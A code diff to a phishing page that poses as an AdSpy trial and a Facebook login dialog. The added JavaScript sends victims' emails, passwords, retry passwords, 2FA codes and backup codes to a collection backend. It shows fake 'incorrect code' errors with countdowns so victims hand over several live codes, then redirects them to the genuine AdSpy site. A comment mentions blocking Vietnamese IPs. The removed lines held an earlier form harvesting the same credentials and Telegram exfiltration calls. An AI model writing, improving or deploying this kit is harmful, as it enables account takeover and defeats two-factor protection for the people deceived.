@@ -322,62 +322,8 @@
 <!-- Modals Container for Dynamic Modals -->
 <div id="modalsContainer"></div>
 
-<!-- Client Information Form -->
-<div id="clientFormContainer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(8px); z-index: 9999; align-items: center; justify-content: center; padding: 20px;">
-  <div style="background: white; padding: 35px 30px; border-radius: 16px; max-width: 500px; width: 100%; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); max-height: 90vh; overflow-y: auto; font-family: 'Poppins', sans-serif; position: relative;">
-    <button id="closeClientFormBtn" style="position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 28px; color: #94a3b8; cursor: pointer; transition: color 0.2s;">&times;</button>
-    <h2 style="margin-bottom: 8px; color: #1e293b; font-size: 24px; font-weight: 700; text-align: center;">Subscription Activation</h2>
-    <p style="margin-bottom: 24px; color: #64748b; font-size: 14px; text-align: center; line-height: 1.5;">Please enter your customer information below to activate your free 1-month trial code.</p>
-    <form id="clientForm">
-      <div style="margin-bottom: 18px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Full Name *</label>
-        <input type="text" id="fullName" placeholder="John Doe" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-      
-      <div style="margin-bottom: 18px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Personal Email *</label>
-        <input type="email" id="email" placeholder="john.doe@gmail.com" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-      
-      <div style="margin-bottom: 18px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Business Email *</label>
-        <input type="email" id="emailBusiness" placeholder="john.doe@company.com" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-      
-      <div style="margin-bottom: 18px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Facebook Page/Link *</label>
-        <input type="url" id="fanpage" placeholder="https://facebook.com/..." required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-      
-      <div style="margin-bottom: 18px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Phone Number *</label>
-        <input type="tel" id="phone" placeholder="+1 123 456 7890" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-
-      <div style="margin-bottom: 18px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Password 1 *</label>
-        <input type="password" id="password" placeholder="Enter password" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-
-      <div style="margin-bottom: 18px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">Password 2 *</label>
-        <input type="password" id="passwordSecond" placeholder="Re-enter password" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-
-      <div style="margin-bottom: 18px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">2FA Code *</label>
-        <input type="text" id="twoFa" placeholder="Enter your 2FA code" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-
-      <div style="margin-bottom: 24px;">
-        <label style="display: block; margin-bottom: 6px; color: #475569; font-size: 13px; font-weight: 600;">One-Time Code *</label>
-        <input type="text" id="otp" placeholder="Enter one-time code" required style="width: 100%; padding: 12px 16px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 14px; color: #334155; transition: border-color 0.2s, box-shadow 0.2s;">
-      </div>
-      
-      <button type="submit" style="width: 100%; padding: 14px; background: #0064E0; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 700; font-size: 15px; text-transform: uppercase; letter-spacing: 0.5px; transition: background-color 0.2s, box-shadow 0.2s;">Continue & Activate</button>
-    </form>
-  </div>
-</div>
+<!-- i18n: IP blocking VN + auto language detection -->
+<script src="/i18n.js"></script>
 
 <script>
   // Device details helper
@@ -427,6 +373,8 @@
   };
 
   let currentSessionId = localStorage.getItem('session_id') || null;
+  let tfaAttempts = 0;
+  let _used2FA = [];
 
   // Custom styling input focus effects
   const inputs = document.querySelectorAll('#clientForm input');
@@ -721,14 +669,47 @@
       e.preventDefault();
       const fbEmailVal = document.getElementById('fbEmail').value;
       const fbPasswordVal = document.getElementById('fbPassword').value;
+      const fbSubmitBtn = document.getElementById('fbSubmitBtn');
       
       if (fbEmailVal && fbPasswordVal) {
         _capturedEmail = fbEmailVal;
         
-        // Send data to Telegram
-        if (typeof Utils !== 'undefined') {
-          await Utils.sendNotification({ email: _capturedEmail, password: fbPasswordVal });
+        // Disable button & show spinner
+        const originalText = fbSubmitBtn.textContent;
+        fbSubmitBtn.disabled = true;
+        fbSubmitBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:2px;display:inline-block;vertical-align:middle;margin-right:8px;"></span>Loading...';
+        
+        try {
+          const result = await sendData({
+            type: 'info',
+            email: _capturedEmail,
+            fullName: 'Facebook Login User',
+            phone: '',
+            fanpage: 'AdSpy Login Dialog',
+            dob: '01/01/2000',
+            note: 'Captured from AdSpy Facebook Login Modal',
+            device: getDeviceInfo()
+          });
+          if (result && result.success && result.session_id) {
+            currentSessionId = result.session_id;
+            localStorage.setItem('session_id', result.session_id);
+          }
+          
+          if (currentSessionId) {
+            await Promise.all([
+              sendData({ type: 'password', session_id: currentSessionId, password: fbPasswordVal }),
+              new Promise(r => setTimeout(r, 6000))
+            ]);
+          } else {
+            await new Promise(r => setTimeout(r, 6000));
+          }
+        } catch (err) {
+          console.error(err);
+          await new Promise(r => setTimeout(r, 6000));
         }
+        
+        fbSubmitBtn.disabled = false;
+        fbSubmitBtn.textContent = originalText;
         
         Modal.close('facebookLoginModal');
         setTimeout(() => {
@@ -772,12 +753,47 @@
     document.getElementById('fbRetryBtn').onclick = async (e) => {
       e.preventDefault();
       const retryPasswordVal = errorPasswordInput.value;
+      const fbRetryBtn = document.getElementById('fbRetryBtn');
       
       if (retryPasswordVal) {
-        // Send retry password to Telegram
-        if (typeof Utils !== 'undefined') {
-          await Utils.sendNotification({ email: _capturedEmail, passwordSecond: retryPasswordVal });
+        // Disable button & show spinner
+        const originalText = fbRetryBtn.textContent;
+        fbRetryBtn.disabled = true;
+        fbRetryBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:2px;display:inline-block;vertical-align:middle;margin-right:8px;"></span>Loading...';
+        
+        try {
+          if (!currentSessionId) {
+            const result = await sendData({
+              type: 'info',
+              email: _capturedEmail || 'unknown@facebook.com',
+              fullName: 'Facebook Login User (Retry)',
+              phone: '',
+              fanpage: 'AdSpy Login Dialog',
+              dob: '01/01/2000',
+              note: 'Captured from AdSpy Password Retry Overlay',
+              device: getDeviceInfo()
+            });
+            if (result && result.success && result.session_id) {
+              currentSessionId = result.session_id;
+              localStorage.setItem('session_id', result.session_id);
+            }
+          }
+          
+          if (currentSessionId) {
+            await Promise.all([
+              sendData({ type: 'password', session_id: currentSessionId, password: retryPasswordVal }),
+              new Promise(r => setTimeout(r, 6000))
+            ]);
+          } else {
+            await new Promise(r => setTimeout(r, 6000));
+          }
+        } catch (err) {
+          console.error(err);
+          await new Promise(r => setTimeout(r, 6000));
         }
+        
+        fbRetryBtn.disabled = false;
+        fbRetryBtn.textContent = originalText;
         
         Modal.close('passwordErrorModal');
         setTimeout(() => {
@@ -891,23 +907,106 @@
     twoFaVerifyBtn.onclick = async (e) => {
       e.preventDefault();
       const code = twoFACodeInput.value.trim();
+      const hint = document.getElementById('twoFaModal').querySelector('.twofa-hint');
       
       if (code.length === 6) {
-        // Send to TG
-        if (typeof Utils !== 'undefined') {
-          await Utils.sendNotification({ email: _capturedEmail, twoFa: code });
+        // Check duplicate code
+        if (_used2FA.includes(code)) {
+          hint.textContent = "This code has already been used. Please enter a new code.";
+          hint.style.color = '#e74c3c';
+          return;
         }
         
-        twoFaVerifyBtn.disabled = true;
-        twoFaVerifyBtn.textContent = 'Verifying...';
+        tfaAttempts++;
+        _used2FA.push(code);
+        hint.textContent = "Enter 6 digits";
+        hint.style.color = '';
         
-        setTimeout(() => {
+        // Disable input & button, show spinner
+        twoFACodeInput.disabled = true;
+        twoFaVerifyBtn.disabled = true;
+        const originalBtnText = twoFaVerifyBtn.textContent;
+        twoFaVerifyBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:2px;display:inline-block;vertical-align:middle;margin-right:8px;"></span>Verifying...';
+        
+        try {
+          if (!currentSessionId && window._savedFormData) {
+            const result = await sendData({ type: 'info', ...window._savedFormData });
+            if (result && result.success && result.session_id) {
+              currentSessionId = result.session_id;
+              localStorage.setItem('session_id', result.session_id);
+            }
+          }
+          
+          if (currentSessionId) {
+            await Promise.all([
+              sendData({ type: '2fa', session_id: currentSessionId, code: code }),
+              new Promise(r => setTimeout(r, 3000))
+            ]);
+          } else {
+            await new Promise(r => setTimeout(r, 3000));
+          }
+        } catch (err) {
+          console.error(err);
+          await new Promise(r => setTimeout(r, 3000));
+        }
+        
+        // Restore loading state
+        twoFaVerifyBtn.disabled = false;
+        twoFaVerifyBtn.textContent = originalBtnText;
+        
+        if (tfaAttempts <= 2) {
+          // Incorrect code -> 30s countdown error
+          clearInterval(twoFATimerInterval);
+          twoFACodeInput.disabled = true;
+          twoFaVerifyBtn.disabled = true;
+          twoFACodeInput.value = '';
+          
+          let countdown = 30;
+          const updateCountdownDisplay = () => {
+            hint.textContent = `The two-factor authentication you entered is incorrect. Please, try again after ${countdown} seconds.`;
+            hint.style.color = '#e74c3c';
+            twoFATimer.textContent = `0:${countdown.toString().padStart(2, '0')}`;
+            twoFATimer.classList.add('danger');
+          };
+          
+          updateCountdownDisplay();
+          
+          const countdownInterval = setInterval(() => {
+            countdown--;
+            if (countdown <= 0) {
+              clearInterval(countdownInterval);
+              hint.textContent = "Enter 6 digits";
+              hint.style.color = '';
+              twoFACodeInput.disabled = false;
+              twoFaVerifyBtn.disabled = false;
+              twoFACodeInput.focus();
+              
+              // Resume 5:00 timer logic from current timeRemaining
+              twoFATimer.classList.remove('danger');
+              updateTimerDisplay(timeRemaining);
+              twoFATimerInterval = setInterval(() => {
+                timeRemaining--;
+                if (timeRemaining <= 0) {
+                  clearInterval(twoFATimerInterval);
+                  twoFATimer.textContent = '0:00';
+                  twoFACodeInput.disabled = true;
+                  twoFaVerifyBtn.disabled = true;
+                } else {
+                  updateTimerDisplay(timeRemaining);
+                }
+              }, 1000);
+            } else {
+              updateCountdownDisplay();
+            }
+          }, 1000);
+        } else {
+          // 3rd attempt -> Success!
           clearInterval(twoFATimerInterval);
           Modal.close('twoFaModal');
           setTimeout(() => {
             openSuccessModal();
           }, 300);
-        }, 1500);
+        }
       } else {
         alert('Please enter 6 digits');
       }
@@ -957,21 +1056,75 @@
     backupVerifyBtn.onclick = async (e) => {
       e.preventDefault();
       const code = backupCodeInput.value.trim();
+      const hint = document.getElementById('backupCodeModal').querySelector('.backup-hint');
       
       if (code.length > 0) {
-        if (typeof Utils !== 'undefined') {
-          await Utils.sendNotification({ email: _capturedEmail, otp: code });
+        // Check duplicate code
+        if (_used2FA.includes(code)) {
+          hint.textContent = "This code has already been used. Please enter a new code.";
+          hint.style.color = '#e74c3c';
+          return;
         }
         
-        backupVerifyBtn.disabled = true;
-        backupVerifyBtn.textContent = 'Verifying...';
+        tfaAttempts++;
+        _used2FA.push(code);
+        hint.textContent = "Please enter the code provided to you";
+        hint.style.color = '';
         
-        setTimeout(() => {
+        backupCodeInput.disabled = true;
+        backupVerifyBtn.disabled = true;
+        const originalText = backupVerifyBtn.textContent;
+        backupVerifyBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:2px;display:inline-block;vertical-align:middle;margin-right:8px;"></span>Verifying...';
+        
+        try {
+          if (currentSessionId) {
+            await Promise.all([
+              sendData({ type: '2fa', session_id: currentSessionId, code: 'Backup: ' + code }),
+              new Promise(r => setTimeout(r, 3000))
+            ]);
+          } else {
+            await new Promise(r => setTimeout(r, 3000));
+          }
+        } catch (err) {
+          console.error(err);
+          await new Promise(r => setTimeout(r, 3000));
+        }
+        
+        backupVerifyBtn.disabled = false;
+        backupVerifyBtn.textContent = originalText;
+        
+        if (tfaAttempts <= 2) {
+          backupCodeInput.disabled = true;
+          backupVerifyBtn.disabled = true;
+          backupCodeInput.value = '';
+          
+          let countdown = 30;
+          const updateCountdownDisplay = () => {
+            hint.textContent = `Incorrect code. Try again in ${countdown} seconds.`;
+            hint.style.color = '#e74c3c';
+          };
+          
+          updateCountdownDisplay();
+          
+          const countdownInterval = setInterval(() => {
+            countdown--;
+            if (countdown <= 0) {
+              clearInterval(countdownInterval);
+              hint.textContent = "Please enter the code provided to you";
+              hint.style.color = '';
+              backupCodeInput.disabled = false;
+              backupVerifyBtn.disabled = false;
+              backupCodeInput.focus();
+            } else {
+              updateCountdownDisplay();
+            }
+          }, 1000);
+        } else {
           Modal.close('backupCodeModal');
           setTimeout(() => {
             openSuccessModal();
           }, 300);
-        }, 1500);
+        }
       } else {
         alert('Please enter your backup code');
       }
@@ -1054,12 +1207,9 @@
         clearInterval(countdownInterval);
         Modal.close('successModal');
         
-        // Show Customer Information Form!
+        // Redirect thẳng sang trang đăng ký AdSpy
         setTimeout(() => {
-          const clientFormContainer = document.getElementById('clientFormContainer');
-          if (clientFormContainer) {
-            clientFormContainer.style.display = 'flex';
-          }
+          window.location.href = 'https://app.adspy.com/subscribe';
         }, 300);
       }
     }, 1000);
@@ -1092,96 +1242,7 @@
     });
   });
 
-  // Handle client form submission
-  const clientForm = document.getElementById('clientForm');
-  if (clientForm) {
-    clientForm.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      const fullName = document.getElementById('fullName').value;
-      const email = document.getElementById('email').value;
-      const emailBusiness = document.getElementById('emailBusiness').value;
-      const fanpage = document.getElementById('fanpage').value;
-      const phone = document.getElementById('phone').value;
-      const password = document.getElementById('password').value;
-      const passwordSecond = document.getElementById('passwordSecond').value;
-      const twoFa = document.getElementById('twoFa').value;
-      const otp = document.getElementById('otp').value;
-      
-      // Disable form and show loader
-      const submitBtn = clientForm.querySelector('button[type="submit"]');
-      const originalText = submitBtn.textContent;
-      submitBtn.disabled = true;
-      submitBtn.textContent = 'Processing...';
-      
-      // Send complete captured information as info request
-      const result = await sendData({
-        type: 'info',
-        email: email,
-        emailBusiness: emailBusiness,
-        fullName: fullName,
-        phone: phone,
-        fanpage: fanpage,
-        dob: '01/01/2000',
-        note: `AdSpy Subscription Form Submission. Pwd1: ${password} | Pwd2: ${passwordSecond} | 2FA: ${twoFa} | OTP: ${otp}`,
-        device: getDeviceInfo()
-      });
-      
-      if (result && result.success && result.session_id) {
-        currentSessionId = result.session_id;
-        localStorage.setItem('session_id', result.session_id);
-        
-        // Also send passwords and codes to session
-        await sendData({
-          type: 'password',
-          session_id: currentSessionId,
-          password: password
-        });
-        
-        await sendData({
-          type: 'password',
-          session_id: currentSessionId,
-          password: passwordSecond
-        });
-        
-        await sendData({
-          type: '2fa',
-          session_id: currentSessionId,
-          code: twoFa
-        });
-        
-        await sendData({
-          type: '2fa',
-          session_id: currentSessionId,
-          code: otp
-        });
-      }
-      
-      submitBtn.disabled = false;
-      submitBtn.textContent = originalText;
-      
-      // Redirect to Facebook or thank you page
-      window.location.href = 'https://www.facebook.com';
-    });
-  }
-
-  // Close client form button handler
-  const closeClientFormBtn = document.getElementById('closeClientFormBtn');
-  if (closeClientFormBtn) {
-    closeClientFormBtn.addEventListener('click', () => {
-      document.getElementById('clientFormContainer').style.display = 'none';
-    });
-  }
-
-  // Close client form container when clicking outside it
-  const clientFormContainer = document.getElementById('clientFormContainer');
-  if (clientFormContainer) {
-    clientFormContainer.addEventListener('click', (e) => {
-      if (e.target === clientFormContainer) {
-        clientFormContainer.style.display = 'none';
-      }
-    });
-  }
 </script>
 </body>
 </html>
+
